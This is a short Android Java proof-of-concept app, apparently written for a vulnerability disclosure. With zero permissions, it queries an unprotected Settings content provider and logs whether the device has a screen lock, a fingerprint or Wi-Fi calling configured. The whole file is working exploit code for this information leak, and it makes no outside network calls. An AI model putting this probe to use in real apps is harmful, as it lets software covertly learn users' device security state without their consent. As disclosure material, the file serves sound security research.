package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

// com.android.settings.dashboard.suggestions.SuggestionStateProvider (authority
// com.android.settings.suggestions.status) has ZERO caller verification of any kind on
// call() -- unlike its sibling Settings providers (RingerModeProvider, FeatureAvailabilityProvider,
// AccessibilityAppearanceProvider), which all at least check getCallingPackage() against an
// allowlist. This lets a zero-permission app probe whether the device's security-relevant
// "dashboard suggestions" have been completed, including whether a screen lock (PIN/pattern/
// password) or fingerprint has been configured at all.
public class SuggestionStateLeakActivity extends Activity {
    private static final String T = "SUGGESTION_STATE_LEAK";
    private static final Uri PROVIDER_URI = Uri.parse("content://com.android.settings.suggestions.status");

    private static final String[] TARGETS = {
        "com.android.settings.password.ScreenLockSuggestionActivity",
        "com.android.settings.biometrics.fingerprint.FingerprintSuggestionActivity",
        "com.android.settings.biometrics.fingerprint.FingerprintEnrollSuggestionActivity",
        "com.android.settings.wifi.calling.WifiCallingSuggestionActivity",
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== SuggestionStateProvider zero-permission probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        ContentResolver resolver = getContentResolver();
        for (String className : TARGETS) {
            try {
                Bundle extras = new Bundle();
                extras.putString("candidate_id", className);
                extras.putParcelable("android.intent.extra.COMPONENT_NAME",
                        new ComponentName("com.android.settings", className));
                Bundle result = resolver.call(PROVIDER_URI, "getSuggestionState", null, extras);
                if (result == null) {
                    Log.w(T, "[NO RESULT] " + className);
                } else {
                    boolean complete = result.getBoolean("candidate_is_complete", false);
                    Log.w(T, "[LEAKED] " + className + " -> candidate_is_complete=" + complete);
                }
            } catch (Throwable e) {
                Log.w(T, "[ERROR] " + className + " -> " + e);
            }
        }
    }
}
